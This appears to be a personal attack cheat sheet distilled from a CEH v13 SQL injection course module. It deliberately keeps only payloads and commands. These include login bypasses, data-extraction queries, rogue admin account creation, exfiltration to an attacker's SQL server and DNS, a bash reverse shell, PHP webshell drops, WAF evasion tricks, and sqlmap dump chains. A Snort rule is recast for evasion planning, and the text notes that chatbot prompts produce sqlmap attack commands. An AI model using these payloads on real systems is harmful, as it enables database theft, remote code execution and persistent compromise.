# CEH v13 Module 15 — SQL Injection (technique synthesis)

Source: `/home/kali/Downloads/CEH/CEHv13 - Module 15 - SQL Injection hide01.ir.pdf` (154 pages).
Method: `pdftoppm -r 150 -gray -png` (whole PDF at once) then `tesseract --psm 3` per page
(native `pdftotext` extraction is useless — the file is watermark-protected and yields only the
repeated string `hide01.ir` char by char, confirmed before choosing OCR).

This file keeps only **offensive techniques / exact payloads / tool commands**, not exam theory.
Page numbers below are the module's own page numbers (as OCR'd, "Module 15 Page NNNN").

## 1. Methodology / probe order

1. **Information gathering**: identify DB type, confirm the app talks to a DB, list every input
   field/hidden field/POST param that could feed a query (p.2312-2314). Tools: Tamper Dev
   (Chrome ext.), Burp Suite — intercept GET/POST to find injectable params.
2. **Vulnerability detection**: throw a single quote, double quote, `;`, `--`, `AND`, `OR` into
   every field and read the error message (p.2315-2317). Generic DB errors reveal OS/DB
   type/version — if the app returns a custom "500"/generic page instead, switch to blind.
3. **Launch attacks**: error-based -> UNION-based -> blind/boolean -> time-based, in that order
   of ease (p.2327 onward).
4. **Advanced/post-exploit**: enumerate DB objects, grab hashes, interact with OS/filesystem,
   pivot into the network (p.2356 onward).

### Quick fingerprint by error message (p.2315-2316)
- `Microsoft OLE DB Provider for ODBC Drivers error '80040e14' ... [SQL Server]` → MSSQL/ODBC.
- `Error in query: Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock'` → MySQL.
- Type-mismatch error (`Error #3132: Data type mismatch`, or `Syntax error converting the varchar value 'test' to a column of data type int`) → confirms unsanitized numeric param, usable for error-based extraction via `CONVERT(int, ...)`.
- Grouping error (`column "x" must appear in the GROUP BY clause`) after `' group by columnnames having 1=1 --` → confirms injectable + helps enumerate column count/names (p.2315).

## 2. Testing-string cheat sheet (p.2318-2320)

Drop these into every field/param, one at a time:
```
' or 1=1--          "or 1=1--         or 1=1--          ' or 'a'='a
' OR '1'='1'        ;OR '1'='1'       %27+--+           "OR 1=1--
' having 1=1--      "OR ''='          'or 1=1/*          'or 1/*
UNI/**/ON SEL/**/ECT                  '; EXEC ('SEL' + 'ECT US' + 'ER')
' union select 1,load_file('/etc/passwd'),1,1,1;
'; exec master..xp_cmdshell 'ping 10.10.1.2'--
' or 1 in (select @@version)--         ' union all select @@version--
' or username like char(37);
'/**/OR/**/1/**/=/**/1
```
(Full table: p.2319-2320, Table 15.2 — also referenced as "CEHv13 Tools, Module 15" cheat sheet.)

Login-bypass one-liners (p.2332):
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or ('1'='1--
' UNION SELECT 1,'anotheruser','doesnt matter',1--
```
MD5-bypass trick — UNION in a known plaintext/hash pair so the app compares your password
against your own injected hash instead of the DB's:
```
Username: admin
Password: 1234' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055
```
(`81dc9bdb52d04dc20036dbd8313ed055` = MD5("1234")) — p.2332.

### Black-box detection recipe (p.2321-2326)
Function/fuzz testing one param at a time:
```
?parameter=1'      ?parameter=1"      ?parameter=1'#     ?parameter=1'/*
?parameter=1 AND 1=1--   ?parameter=1 AND 1=2--   ?parameter=1' AND '1'='1'
?parameter=1 order by 1000
```
Fuzzers: BeSTORM, Burp Suite, AppScan Standard, Defensics, SnapFuzz.
Truncation/overflow probe: send long strings of `'`/`]`/`"` to overflow `REPLACE`/`QUOTENAME`
and truncate the query variable (p.2323-2324).

## 3. Error-based extraction

MSSQL, forcing a type-cast error to leak data one value at a time (p.2327-2328):
```
...?id=1 or 1=convert(int,(DB_NAME))--
...?id=1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--      -- 1st table
...?id=1 or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns
            where table_name='TABLE-NAME-1'))--                                           -- 1st column
...?id=1 or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--                -- 1st field value
```
The value you're after shows up inside the `Syntax error converting the nvarchar value '...'`
message.

Oracle hostname-leak trick, concatenating a subquery into a function that forces a DNS-style
error (p.2301-2302):
```
http://target/product.php?id=10||UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL))--
→ ORA-29257: host <RESULT> unknown
```

Stored-procedure injection when the backend builds dynamic SQL inside a proc (p.2329-2330):
```
User input: anyusername or 1=1' anypassword
```
turns `... WHERE username='<input>' and passwd='...'` into an always-true clause even though
the vulnerability lives inside the stored procedure, not the outer query.

## 4. UNION-based extraction

Step 1 — find column count via `ORDER BY N--`, increment until error (p.2304).
Step 2 — find column types with `UNION SELECT 1,null,null--` etc.
Step 3 — extract (p.2331-2332, MSSQL):
```
...?id=1 UNION SELECT ALL 1,DB_NAME,3,4--
...?id=1 UNION SELECT ALL 1,TABLE_NAME,3,4 from sysobjects where xtype=char(85)--
...?id=1 UNION SELECT ALL 1,column_name,3,4 from DB_NAME.information_schema.columns
        where table_name='EMPLOYEE_TABLE'--
...?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME--
```
Classic cross-table pivot:
```
SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

## 5. Blind / Boolean / time-based

Boolean (MySQL), reading one character at a time via ASCII compare (p.2333):
```
/?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),1,1))=97,555,777)
```
Classic true/false probe pair: `...id=67 and 1=2` (false → empty) vs `...id=67 and 1=1` (true →
normal page) (p.2309-2310).

Time-based (MSSQL `WAITFOR`, MySQL `BENCHMARK`) — binary search over `LEN()` then `ASCII(lower(substring(...)))`
(p.2334-2339, exact pattern, reusable for any scalar):
```
...?id=1; IF (LEN(USER)=N) WAITFOR DELAY '00:00:10'--
...?id=1; IF (ASCII(lower(substring((USER),POS,1)))=N) WAITFOR DELAY '00:00:10'--
```
Same pattern swapping `USER` for `DB_NAME()`, `(SELECT TOP 1 NAME from sysobjects where xtype='U')`
(table names), `(SELECT TOP 1 column_name from DB.information_schema.columns where table_name='X')`
(column names, use `column_name>'LAST_FOUND'` to walk to the next one), or `(SELECT TOP 1 COL from TABLE)`
(row data) — p.2336-2340. Note in text: finding one 8-char username via pure binary search needs
~56 requests (7 per char) — budget accordingly before committing to full blind extraction.

Heavy-query trick when `WAITFOR`/`BENCHMARK` are disabled — force a slow self-join instead of a
sleep (p.2341, Oracle):
```
SELECT * FROM products WHERE id=1 AND 1 < (SELECT count(*) FROM all_users A, all_users B, all_users C)
```

## 6. Database/table/column enumeration cookbook (p.2356-2360)

Identify privilege/current user:
```
user or current_user, session_user, system_user
' and 1 in (select user)--
'; if user='dbo' waitfor delay '0:0:5'--
```
Default admin account names to try: `sa, system, sys, dba, admin, root`.

Per-DBMS column enumeration:
```
MSSQL:      SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')
            sp_columns tablename
MySQL:      show columns from tablename
Oracle:     SELECT * FROM all_tab_columns WHERE table_name='tablename'
DB2:        SELECT * FROM syscat.columns WHERE tabname='tablename'
PostgreSQL: SELECT attnum,attname from pg_class, pg_attribute WHERE relname='tablename'
            AND pg_class.oid=attrelid AND attnum>0
```
Tables-and-columns in **one** query (MSSQL, p.2358):
```
' union select 0, sys.objects.name+': '+sys.columns.name+': '+sys.types.name,1,1,'1',1,1,1,1,1
  from sys.objects, sys.columns, sys.types
  where sys.objects.xtype='U' AND sys.objects.id=sys.columns.id AND sys.columns.xtype=sys.types.xtype --
```
List every DB on the server + file paths (p.2359):
```
' and 1 in (select min(name) from master.dbo.sys.databases where name>'.')--
' and 1 in (select min(filename) from master.dbo.sys.databases where filename>'.')--
```
DBMS feature cheat-table (p.2359): concat operator `+` (MSSQL/Access) vs `||` (Oracle/PostgreSQL/DB2)
vs `concat()`/`concat_ws()` (MySQL); comments `--`,`/* */`,`#` vary by engine — check before
crafting payloads for an unknown backend.

Create a rogue DB account (p.2360):
```
MSSQL:   exec sp_addlogin 'victor','Pass123'; exec sp_addsrvrolemember 'victor','sysadmin'
Oracle:  CREATE USER victor IDENTIFIED BY Pass123 ...; GRANT CONNECT TO victor; GRANT RESOURCE TO victor;
MySQL:   INSERT INTO mysql.user (user,host,password) VALUES ('victor','localhost',PASSWORD('Pass123'))
```

### Password/hash grabbing (p.2361-2363)
Dump a user-defined table into a side channel when results aren't directly visible:
```
begin declare @var varchar(8000) set @var=':'
select @var=@var+' '+login+'/'+password+' ' from users where login>@var
select @var as var into temp end; --
' and 1 in (select var from temp)--
'; drop table temp --
```
MSSQL hash extraction via `sys.syslogins`, converted hash→hex→concat so it fits in an error
message; leak in 256-byte chunks via `substring(x,256,256)` then `substring(x,512,256)` etc.
Note: the `password` field itself needs dba rights, but even without it you can recover
**usernames** and brute-force offline.

### Exfil DB to attacker's own SQL server (p.2364)
```
';insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
  'select * from mydatabase..hacked_sysdatabases') select * from sys.sysdatabases --
```
(repeat swapping target table: `sys.sysobjects`, `sys.syscolumns`, any user table) — connects
out to the attacker's listener on port 80 and replicates data there.

## 7. OS / filesystem interaction

MSSQL direct command exec + exfil through a temp table (p.2365):
```
'; exec master..xp_cmdshell 'ipconfig > test.txt' --
'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --
'; begin declare @data varchar(8000) set @data='|' select @data=@data+txt+'|' from tmp
    where txt<@data select @data as x into temp end --
' and 1 in (select substring(x,1,256) from temp) --
'; declare @var sysname; set @var='del test.txt'; EXEC master..xp_cmdshell @var;
    drop table temp; drop table tmp --
```
MySQL UDF route when `xp_cmdshell`-equivalent isn't built in:
```
CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';
CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';
```

File read/write (MySQL, p.2367):
```
NULL UNION ALL SELECT LOAD_FILE('/etc/passwd') /*
NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>'
  INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*
```
then `shell.php?command=wget ...` for a full webshell.

Webshell drop via dumpfile when `OUTFILE` is blocked (p.2373):
```
SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'
SELECT @@datadir;   -- find where to drop it
```
MSSQL reverse shell one-liner once `xp_cmdshell` is live (p.2374):
```
EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```
Database trigger backdoor (Oracle, p.2374) — e.g. zero out prices on every INSERT/UPDATE:
```
CREATE OR REPLACE TRIGGER SET_PRICE AFTER INSERT OR UPDATE ON ITEMS FOR EACH ROW
BEGIN UPDATE ITEMS SET Price = 0; END;
```

### Network recon from inside the DBMS (p.2376)
```
' and 1 in (select @@servername)--
' and 1 in (select srvname from sys.sysservers)--
'; exec master..xp_cmdshell 'nslookup a.com MyIP' --
'; exec master..xp_cmdshell 'ping 10.0.0.75' --
'; select * from OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=10.0.0.75,80;','select * from table')
```
Follow-up local commands once a shell is live: `ipconfig /all`, `tracert myIP`, `arp -a`,
`nbtstat -c`, `netstat -ano`, `route print`.
Blind out-of-band DNS exfil via `xp_dirtree` (p.5295, same module, no page break captured cleanly):
```
DECLARE @hostname varchar(1024);
SELECT @hostname=(SELECT HOST_NAME())+'.appserver.example.com';
EXEC('master.dbo.xp_dirtree "\\'+@hostname+'\c$"');
```
(resolves attacker-controlled subdomain → confirms blind OOB execution without any visible output)

## 8. HTTP header-based injection (p.2375-2376)

Any header the app trusts and concatenates into SQL is injectable, not just GET/POST params —
`User-Agent`, `Cookie`, `Referer`, and especially `X-Forwarded-For` when the app logs/queries the
client IP without validating it's actually an IP:
```php
$ip_addr = $_SERVER['HTTP_X_FORWARDED_FOR'];  // trusted blindly if regex check is missing/weak
```
Send a crafted `X-Forwarded-For: <payload>` header to hit the same injection point server-side
even though the visible form fields are sanitized.

## 9. PL/SQL procedure injection & truncation (p.2371)

If the app wraps input in a stored proc that concatenates it unsafely:
```
EXEC Validate_UserPassword('Bob', 'x'' OR ''1''=''1');
```
Truncation bypass using an inline comment to drop the password check entirely:
```
EXEC Validate_UserPassword('Bob''--', '');
```

## 10. NoSQL / MongoDB injection (p.2377-2378)

Auth bypass using Mongo operators instead of SQL syntax when the app builds a query object
straight from POST data:
```
user_name[$eq]=admin&pwd[$ne]=admin
```
`$where`-based JS injection (when the app allows `$where` queries) to dump all users with an
always-true JS comparison, or trigger a DoS via infinite loop (`$where: 'while(true){}'`):
```
$myquery = array('$where' => 'this.username === \''.$username.'\'');
```

## 11. JSON-based WAF bypass (p.2354)

When the WAF blacklists `=`, `<`, `>`, send JSON operators instead of SQL metacharacters in a
POST body the backend parses unsafely:
```json
{"user": "<username>' --","pass": "irrelevant"}
```

## 12. Insert/Update via injection (p.2354-2355)

Add a new account:
```
SELECT * FROM Users WHERE Email_ID='Alice@xyz.com'; INSERT INTO Users
  (Email_ID,User_Name,Password) VALUES ('Clark@mymail.com','Clark','MyPassword');--
```
Hijack "forgot password" by rewriting the victim's email, then triggering the reset flow
yourself:
```
SELECT * FROM Users WHERE Email_ID='Alice@xyz.com'; UPDATE Users SET Email_ID='Clark@mymail.com'
  WHERE Email_ID='Alice@xyz.com';
```

## 13. WAF / IDS evasion toolkit (p.2350-2415) — pièges à connaître

- **Normalization abuse**: `/?id=1/*union*/union/*select*/select+1,2,3/*` when the WAF only
  blocks the clean `union select` pattern.
- **HPP** (HTTP Parameter Pollution): split the query across duplicate params —
  `/?id=1;select+1&id=2,3+from+users+where+id=1--`.
- **HPF** (HTTP Parameter Fragmentation), combine with UNION across two params:
  `/?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--`.
- **Signature bypass** by cosmetic rewrite: `/?id=(1)union(select(1),mid(hash,1,32)from(users))`.
- **Buffer-overflow crash probe** against the WAF itself (C/C++ WAFs): pad with ~1200 `A`s before
  the real payload, check for a 500 as a sign the filter crashed/was bypassed.
- **CRLF injection**: `%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5--`.
- **Integration method**: stack several of the above at once (comment-split keywords + hex +
  buffer pad) when no single trick clears the filter alone.
- **In-line comments** to break up keywords without whitespace:
  `'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username/**/LIKE/**/'admin'--`.
- **char() encoding** (MySQL, no quotes needed):
  `' union select 1,(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;` (`/etc/passwd`)
  `' or username like char(37);` (`%`) · `' union select * from users where login=char(114,111,111,116);` (`root`)
- **String concat split** to break up blacklisted keywords: Oracle `'; EXECUTE IMMEDIATE 'SEL'||'ECT US'||'ER'`,
  MSSQL `'; EXEC('DRO'+'P T'+'AB'+'LE')`, MySQL `'; EXECUTE CONCAT('INSE','RT US','ER')`.
- **Hex encoding** whole statements, no quotes at all:
  `; declare @x varchar(80); set @x=0x73656c656374...; EXEC(@x)`.
- **Sophisticated tautology matches** beyond `OR 1=1` (less likely to be in a WAF regex):
  `' OR 'john'='john'`, `' OR 'microsoft'='micro'+'soft'`, `' OR 5 BETWEEN 1 AND 7`,
  `' OR 'whatever' IN ('whatever')`.
- **URL / double-URL encoding**: `'` → `%27` → `%2527`; use double when single-encoding is
  stripped once by the filter before matching.
- **Null-byte prefix**: `%00' UNION SELECT Password FROM Users WHERE UserName='admin'--`.
- **Case randomization**: `UnIoN sEleCt UsEr_iD, PaSSwOrd fROm aDmiN wHeRe UseR_NamE='AdMIn'--`.
- **Declare-variable indirection** (MSSQL) to hide the keyword from static matching:
  `; declare @sqlvar nvarchar(70); set @sqlvar=(N'UNI'+N'ON'+N' SELECT'+N'Password'); EXEC(@sqlvar)`.
- **IP fragmentation**: split the attack across out-of-order/delayed TCP/IP fragments so the
  WAF never sees the full reassembled signature before the DB does.

## 14. Tools

- **sqlmap** (https://sqlmap.org) — the default. Six techniques supported: boolean-blind,
  time-blind, error-based, UNION, stacked queries, out-of-band. Key invocation chain used in the
  module's own examples (swap URL/param/DB/table per target):
  ```bash
  sqlmap -u "http://target/listproducts.php?cat=1" --batch --technique=B --dbs
  sqlmap -u "http://target/listproducts.php?cat=1" -D acuart --tables
  sqlmap -u "http://target/listproducts.php?cat=1" -D acuart -T users --columns
  sqlmap -u "http://target/listproducts.php?cat=1" -D acuart -T users --dump
  # broad discovery crawl:
  sqlmap -u "http://target" --batch --crawl=5 --random-agent --level=5 --risk=3
  ```
  Also auto-cracks recognized password hash formats via dictionary attack, and can pivot to a
  direct DB connection (skip the injection entirely) once creds are known.
- **Mole** — CLI, auto-detects + exploits via UNION or boolean; supports MySQL/Postgres/
  SQL Server/Oracle; has filter bypass presets for IDS/IPS evasion; handles GET/POST/Cookie
  injection points and binary-data exfil.
- **jSQL Injection**, **NoSQLMap**, **Havij**, **blind_sql_bitshifting** — all on GitHub/
  SourceForge, same family of automated exploiters (NoSQLMap specifically targets Mongo-style
  injection from §10 above).
- **AI-assisted recon**: feeding ChatGPT-style prompts like *"Perform error based SQL injection on
  target url ... and enumerate the tables in <db> database"* reliably gets back a ready-to-run
  sqlmap command chain (the module demonstrates this explicitly for boolean, error, and
  time-based checks) — useful as a fast way to generate the right sqlmap flags for a technique
  without memorizing them.
- Source-code-review tools (less offensive, but useful to recognize if seen in a CI pipeline):
  Veracode, SonarQube, PVS-Studio, Coverity Scan, Parasoft Jtest, CAST AIP, Klocwork.

## 15. What gets you flagged (brief defensive note, for evasion planning)

Snort signature example actually shown in the module (sleep-based timing fingerprint in headers):
```
alert tcp any any -> any $HTTP_PORTS (msg:"SQL use of sleep function in HTTP header - likely SQL
injection attempt"; content:"User-Agent|3A| "; content:"sleep(",fast_pattern,nocase;
pcre:"/User-Agent\x3A\x20[^\r\n]*sleep\x28/i"; sid:38993;)
```
→ confirms: time-based payloads in headers (not just URL params) are specifically hunted for;
prefer boolean/UNION/error-based first, keep `sleep`/`WAITFOR`/`BENCHMARK` as last resort and
vary the delay/keyword casing per the evasion list in §13.
